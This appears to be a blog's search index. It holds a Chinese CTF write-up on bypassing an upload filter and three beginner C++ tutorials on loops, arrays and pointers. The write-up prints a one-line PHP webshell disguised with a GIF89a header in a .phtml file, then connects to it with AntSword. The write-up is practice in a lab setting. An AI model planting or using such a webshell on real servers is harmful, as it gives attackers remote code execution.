<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>ACTF2020 新生赛 Upload</title>
    <url>/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/</url>
    <content><![CDATA[<p>同样是一道上传题，上传已有木马</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162637320.png" alt="image-20211202162637320"></p>
<span id="more"></span>

<p>换gif木马重新尝试</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162755354.png" alt="image-20211202162755354"></p>
<p>上传成功，打开指定网址查看是否有上传文件</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162849704.png" alt="image-20211202162849704"></p>
<p>果然有</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162906119.png" alt="image-20211202162906119"></p>
<p>接着打开蚁剑连接，发现</p>
<p><strong><u>上传的图片中的代码不能用</u></strong></p>
<p>换方法</p>
<p>随便上传一个图片，然后修改其后缀和内容</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173541721.png" alt="image-20211202173541721"></p>
<p>改为php后，不通过，则改为phtml</p>
<p>并插入代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>如图</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173720354.png" alt="image-20211202173720354"></p>
<p>提交后</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173743862.png" alt="image-20211202173743862"></p>
<p>进入蚁剑连接</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173834016.png" alt="image-20211202173834016"></p>
<p>在根目录下得到flag</p>
<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173912850.png" alt="image-20211202173912850"></p>
]]></content>
      <tags>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>C++中的循环结构和跳转语句</title>
    <url>/2021/12/16/C-%E4%B8%AD%E7%9A%84%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="一、循环结构"><a href="#一、循环结构" class="headerlink" title="一、循环结构"></a>一、循环结构</h1><h2 id="1-while循环结构"><a href="#1-while循环结构" class="headerlink" title="1.while循环结构"></a>1.while循环结构</h2><p>作用：满足循环条件，执行循环语句</p>
<p>语法：<code>while(循环条件)&#123;循环语句&#125;</code></p>
<p>解释：只要满足循环条件即执行循环语句，直到条件不符合时才停止</p>
<span id="more"></span>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(n&lt;<span class="number">10</span>)          <span class="comment">//打印1~10</span></span><br><span class="line">    &#123;</span><br><span class="line">        n++;</span><br><span class="line">        cout&lt;&lt;n&lt;&lt;endl;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-do…while循环语句"><a href="#2-do…while循环语句" class="headerlink" title="2.do…while循环语句"></a>2.do…while循环语句</h2><p>作用：先执行一次循环语句，再判断循环条件</p>
<p>语法：<code>do&#123;循环语句&#125; while(循环条件);</code></p>
<p>注意：与while循环语句的主要区别就是第一次判断的先后</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        n++;</span><br><span class="line">        cout&lt;&lt;n&lt;&lt;endl;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(n&gt;<span class="number">10</span>);<span class="comment">//此程序会输出1，而while程序则什么也不输出</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-for循环语句"><a href="#3-for循环语句" class="headerlink" title="3.for循环语句"></a>3.for循环语句</h2><p>语法：<code>for(起始表达式；条件表达式；末尾循环体)&#123;循环语句；&#125;</code></p>
<p>示例：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> n=<span class="number">0</span>;n&lt;<span class="number">10</span>;n++)<span class="comment">//此处用分号分割</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;n&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-嵌套循环"><a href="#4-嵌套循环" class="headerlink" title="4.嵌套循环"></a>4.嵌套循环</h2><p>作用：在循环体中再嵌套一层循环，解决一些实际问题</p>
<p>示例：</p>
<p>打印*阵图</p>
<p><img src="/2021/12/16/C-%E4%B8%AD%E7%9A%84%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/image-20211217200102802.png" alt="image-20211217200102802"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">10</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;* &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="二、跳转语句"><a href="#二、跳转语句" class="headerlink" title="二、跳转语句"></a>二、跳转语句</h1><h2 id="1-break语句"><a href="#1-break语句" class="headerlink" title="1.break语句"></a>1.break语句</h2><p>作用：用于跳出选择结构或者循环结构</p>
<p>break的使用时机</p>
<ul>
<li>出现在switch条件语句中，作用是终止case并跳出switch</li>
<li>出现在循环语句中，作用是跳出当前循环语句</li>
<li>出现在嵌套中，作用是跳出最近的内层嵌套语句</li>
</ul>
<h2 id="2-continue语句"><a href="#2-continue语句" class="headerlink" title="2.continue语句"></a>2.continue语句</h2><p>作用：在循环语句中，跳过本次循环中余下尚未执行的语句，继续执行下一次循环</p>
<p>示例</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">continue</span>;<span class="comment">//不输出偶数  </span></span><br><span class="line">        &#125;</span><br><span class="line">            </span><br><span class="line">        cout&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-goto语句"><a href="#3-goto语句" class="headerlink" title="3.goto语句"></a>3.goto语句</h2><p>作用：无条件跳转语句</p>
<p>语法：<code>goto 标记;</code></p>
<p>解释：如果标记的名称存在的，执行goto语句时，会跳转到标记位置。（但是一般不用）</p>
<p>例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;1&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">goto</span> flag;<span class="comment">//跳转到flag语句</span></span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;2&quot;</span>&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;3&quot;</span>&lt;&lt;endl;</span><br><span class="line">    flag:</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;4&quot;</span>&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++中的数组</title>
    <url>/2022/01/15/C-%E4%B8%AD%E7%9A%84%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>所谓数组，就是一个集合，里面存放了相同类型的数据元素</p>
<p>特点：</p>
<ul>
<li>数组中的每个数据元素都是相同的数据类型</li>
<li>数组是由连续的内存位置组成的</li>
</ul>
<h1 id="一维数组的定义方式"><a href="#一维数组的定义方式" class="headerlink" title="一维数组的定义方式"></a>一维数组的定义方式</h1><ul>
<li><p><code>数据类型 数组名[数组长度];</code></p>
</li>
<li><p><code>数据类型 数组名[数组长度] = &#123;值1,值2,...&#125;;</code></p>
</li>
<li><p><code>数据类型 数组名[ ] = &#123;值1,之2,...&#125;;</code></p>
<span id="more"></span></li>
</ul>
<p>方式1</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">5</span>];</span><br><span class="line">    arr[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    arr[<span class="number">1</span>]=<span class="number">10</span>;</span><br><span class="line">    arr[<span class="number">2</span>]=<span class="number">20</span>;</span><br><span class="line">    arr[<span class="number">3</span>]=<span class="number">30</span>;</span><br><span class="line">    arr[<span class="number">4</span>]=<span class="number">40</span>;</span><br><span class="line">    cout&lt;&lt;arr[<span class="number">2</span>]&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>方式2</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">5</span>] = &#123;<span class="number">0</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>&#125;;</span><br><span class="line">    cout&lt;&lt;arr[<span class="number">2</span>]&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>方式3</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> arr[]=&#123;<span class="number">0</span>,<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)                 <span class="comment">//利用for循环输出，注意i得范围，此处i最大为4</span></span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;arr[i]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="一维数组数组名"><a href="#一维数组数组名" class="headerlink" title="一维数组数组名"></a>一维数组数组名</h1><p>用途：</p>
<ul>
<li>可以统计整个数组在内存中的长度</li>
<li>可以获取数组在内存中的首地址</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    cout&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(arr)&lt;&lt;endl;  <span class="comment">//整个数组占用的存储空间</span></span><br><span class="line">    cout&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(arr[<span class="number">0</span>])&lt;&lt;endl;  <span class="comment">//int为4个字节</span></span><br><span class="line">    cout&lt;&lt;arr&lt;&lt;endl;  <span class="comment">//打印首地址，默认为16进制</span></span><br><span class="line">    cout&lt;&lt;(<span class="keyword">int</span>) arr&lt;&lt;endl;<span class="comment">//转换为10进制</span></span><br><span class="line">    cout&lt;&lt;&amp;arr[<span class="number">0</span>]&lt;&lt;endl;<span class="comment">//第一个元素的地址，注意有 &amp;</span></span><br><span class="line">    cout&lt;&lt;(<span class="keyword">int</span>)&amp;arr[<span class="number">0</span>]&lt;&lt;endl;<span class="comment">//转换为10进制</span></span><br><span class="line">    cout&lt;&lt;(<span class="keyword">int</span>)&amp;arr[<span class="number">1</span>]&lt;&lt;endl;<span class="comment">//与第一个差4个字节</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>数组名是常量，不能赋值</strong></p>
<h1 id="二维数组定义方式"><a href="#二维数组定义方式" class="headerlink" title="二维数组定义方式"></a>二维数组定义方式</h1><ul>
<li><code>数据类型 数组名[行数] [列数];</code></li>
<li><code>数据类型 数组名[行数] [列数] = &#123;&#123;数据1,数据2&#125;,&#123;数据3,数据4&#125;&#125;;</code></li>
<li><code>数据类型 数组名[行数] [列数] = &#123;数据1,数据2，数据3,数据4&#125;;</code></li>
<li><code>数据类型 数组名[] [列数] = &#123;数据1,数据2，数据3,数据4&#125;;</code></li>
</ul>
<p><strong>建议使用第二种</strong>,  “=”可有可无</p>
<p>第一种</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">2</span>][<span class="number">3</span>];<span class="comment">//二行三列数组</span></span><br><span class="line">    arr[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    arr[<span class="number">0</span>][<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">    arr[<span class="number">0</span>][<span class="number">2</span>]=<span class="number">3</span>;</span><br><span class="line">    arr[<span class="number">1</span>][<span class="number">0</span>]=<span class="number">4</span>;</span><br><span class="line">    arr[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">5</span>;</span><br><span class="line">    arr[<span class="number">1</span>][<span class="number">2</span>]=<span class="number">6</span>;</span><br><span class="line">    cout&lt;&lt;arr[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    cout&lt;&lt;arr[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">    cout&lt;&lt;arr[<span class="number">0</span>][<span class="number">2</span>];</span><br><span class="line">    cout&lt;&lt;arr[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">    cout&lt;&lt;arr[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">    cout&lt;&lt;arr[<span class="number">1</span>][<span class="number">2</span>];</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">int</span> i,j; <span class="comment">//也可以这样输出，外层打印行，内层打印列</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;arr[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第二种</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">2</span>][<span class="number">3</span>]</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">        &#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;</span><br><span class="line">    &#125;;<span class="comment">// 该处;不要忘记</span></span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;arr[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>第三种</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">2</span>][<span class="number">3</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;arr[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第四种</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[][<span class="number">3</span>]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;<span class="comment">//行可以省去，列不可以省去</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;arr[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="二维数组数组名"><a href="#二维数组数组名" class="headerlink" title="二维数组数组名"></a>二维数组数组名</h1><p>用途</p>
<ul>
<li><p>查看二维数组所占内存空间</p>
</li>
<li><p>获取二维数组首位置</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">2</span>][<span class="number">3</span>]</span><br><span class="line">    &#123;</span><br><span class="line">        &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,</span><br><span class="line">        &#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    cout&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(arr)&lt;&lt;endl;<span class="comment">//整个数组所占外存，单位是字节</span></span><br><span class="line">    cout&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(arr[<span class="number">0</span>])&lt;&lt;endl;<span class="comment">//一行所占存储空间</span></span><br><span class="line">    cout&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(arr[<span class="number">0</span>][<span class="number">0</span>])&lt;&lt;endl;<span class="comment">//某个元素所占存储空间</span></span><br><span class="line">    cout&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(arr)/<span class="built_in"><span class="keyword">sizeof</span></span>(arr[<span class="number">0</span>])&lt;&lt;endl;<span class="comment">//二维数组行数</span></span><br><span class="line">    cout&lt;&lt;<span class="built_in"><span class="keyword">sizeof</span></span>(arr[<span class="number">0</span>])/<span class="built_in"><span class="keyword">sizeof</span></span>(arr[<span class="number">0</span>][<span class="number">0</span>])&lt;&lt;endl;<span class="comment">//二维数组列数</span></span><br><span class="line">    cout&lt;&lt;arr&lt;&lt;endl;<span class="comment">//二维数组首地址</span></span><br><span class="line">    cout&lt;&lt;(<span class="keyword">int</span>) arr&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;(<span class="keyword">int</span>) arr[<span class="number">0</span>]&lt;&lt;endl;<span class="comment">//第一行首地址</span></span><br><span class="line">    cout&lt;&lt;(<span class="keyword">int</span>) &amp;arr[<span class="number">0</span>][<span class="number">0</span>]&lt;&lt;endl;<span class="comment">//第一个元素的首地址，注意别丢了&amp;</span></span><br><span class="line">    cout&lt;&lt;(<span class="keyword">int</span>) arr[<span class="number">1</span>]&lt;&lt;endl;<span class="comment">//第二行首地址</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>C++中的指针</title>
    <url>/2022/02/23/C-%E4%B8%AD%E7%9A%84%E6%8C%87%E9%92%88/</url>
    <content><![CDATA[<h1 id="指针的基本概念"><a href="#指针的基本概念" class="headerlink" title="指针的基本概念"></a>指针的基本概念</h1><p>可以通过指针来保存一个地址</p>
<h2 id="指针作用"><a href="#指针作用" class="headerlink" title="指针作用"></a>指针作用</h2><p>可以通过指针间接访问内存</p>
<ul>
<li>内存编号是从0开始记录的，一般用十六进制数字表示</li>
<li>可以利用指针的变量保存地址</li>
</ul>
<span id="more"></span>

<h1 id="指针的定义和使用"><a href="#指针的定义和使用" class="headerlink" title="指针的定义和使用"></a>指针的定义和使用</h1><p>指针定义语法：<code>数据类型 * 指针变量名</code>例如int * p;</p>
<p>&amp;为取址符，例如</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> * p;</span><br><span class="line">    p=&amp;a;</span><br><span class="line">    cout &lt;&lt;<span class="string">&quot;a的地址为&quot;</span>&lt;&lt;&amp;a&lt;&lt; endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;指针p为&quot;</span>&lt;&lt;p&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;*p&lt;&lt;endl;</span><br><span class="line">    *p=<span class="number">1000</span>;</span><br><span class="line">    cout&lt;&lt;a&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

